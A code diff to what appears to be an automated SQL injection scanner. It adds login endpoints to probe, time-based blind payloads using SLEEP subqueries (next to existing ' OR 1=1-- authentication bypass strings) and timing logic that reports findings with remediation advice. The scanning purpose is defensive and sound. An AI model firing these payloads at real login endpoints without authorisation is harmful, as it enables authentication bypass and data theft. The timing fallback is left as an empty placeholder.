@@ -57,10 +57,13 @@ class SQLInjectionConfig:
         "/user/login",
         "/api/user/login",
         "/api/authenticate",
-        "/authenticate",
+        "/unauthorized",
+        "/api/user/authenticate",
     ]
 
     # JSON login payloads - credentials with SQL injection
+    # delay is defined locally to avoid NameError during class definition
+    _delay = 5
     JSON_LOGIN_PAYLOADS = [
         # Classic SQL injection bypass
         {"email": "' OR 1=1--", "password": "anything"},
@@ -73,6 +76,10 @@ class SQLInjectionConfig:
         {"username": "' OR 1=1--", "password": "anything"},
         {"username": "admin'--", "password": "anything"},
         {"user": "' OR 1=1--", "password": "anything"},
+        # Time-based blind login payloads (Generic)
+        {"email": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
+        {"username": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
+        {"email": f"admin' AND SLEEP({_delay})--", "password": "anything"},
     ]
 
 
@@ -371,6 +378,11 @@ class SQLInjectionAgent(BaseSecurityAgent):
                 continue
 
             self.log(f"Testing login endpoint: {login_url}")
+            
+            # Record baseline response time
+            baseline_start = time.time()
+            baseline_resp = await self.make_request(login_url, method="POST", json={"email": "nonexistent_matrix_user@test.com", "password": "password"})
+            baseline_duration = time.time() - baseline_start
 
             # Test each JSON payload
             for payload in SQLInjectionConfig.JSON_LOGIN_PAYLOADS:
@@ -399,10 +411,19 @@ class SQLInjectionAgent(BaseSecurityAgent):
                     # 2. Response status is 200 (success) when it should fail
                     is_success = response.status_code == 200
                     
-                    # 3. Check for SQL error (indicates injection point)
+                    # 3. Time-based detection
+                    duration = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
+                    if duration == 0: # Fallback if elapsed not available
+                         # This is a bit of a hack since make_request doesn't return timing yet in all cases
+                         # but BaseSecurityAgent.make_request should ideally provide this.
+                         pass
+                    
+                    is_delayed = duration >= SQLInjectionConfig.TIME_DELAY_SECONDS * 0.8
+                    
+                    # 4. Check for SQL error (indicates injection point)
                     has_sql_error = any(pattern.search(response.text) for pattern in self.error_patterns)
                     
-                    # 4. Response contains user data (bypass worked)
+                    # 5. Response contains user data (bypass worked)
                     has_user_data = any(k in str(response_json).lower() for k in ['email', 'user', 'id', 'admin'])
 
                     if has_sql_error:
@@ -444,6 +465,44 @@ class SQLInjectionAgent(BaseSecurityAgent):
                                 method="POST",
                                 parameter="email/username (JSON body)",
                                 detection_method="error_based",
+                                db_type=detected_db,
+                                is_auth_bypass=True
+                            )
+                        )]
+
+                    if is_delayed:
+                        # Time-based blind injection!
+                        return [self.create_result(
+                            vulnerability_type=VulnerabilityType.SQL_INJECTION,
+                            is_vulnerable=True,
+                            severity=Severity.CRITICAL,
+                            confidence=self.get_confidence_threshold("medium"),
+                            detection_method="Time-based blind (JSON login)",
+                            audit_log=[f"Detected significant delay ({duration:.2f}s) in response to time-based payload"],
+                            url=login_url,
+                            parameter="email/username (JSON body)",
+                            method="POST",
+                            title="Blind SQL Injection in Login (Time-based)",
+                            description=(
+                                f"Critical blind SQL injection vulnerability in login endpoint. "
+                                f"The application is susceptible to time-based blind injection, "
+                                f"allowing attackers to exfiltrate data or bypass authentication by measuring response times."
+                            ),
+                            evidence=f"Payload: {payload}\nResponse time: {duration:.2f}s (Baseline: {baseline_duration:.2f}s)",
+                            remediation=(
+                                "1. Use parameterized queries for ALL database operations\n"
+                                "2. Never concatenate user input into SQL queries\n"
+                                "3. Use a secure authentication framework\n"
+                                "4. Implement rate limiting and monitoring"
+                            ),
+                            owasp_category="A03:2021 – Injection",
+                            cwe_id="CWE-89",
+                            request_data={"payload": payload},
+                            vulnerability_context=self._build_sqli_context(
+                                url=login_url,
+                                method="POST",
+                                parameter="email/username (JSON body)",
+                                detection_method="time_based",
                                 db_type=detected_db,
                                 is_auth_bypass=True
                             )
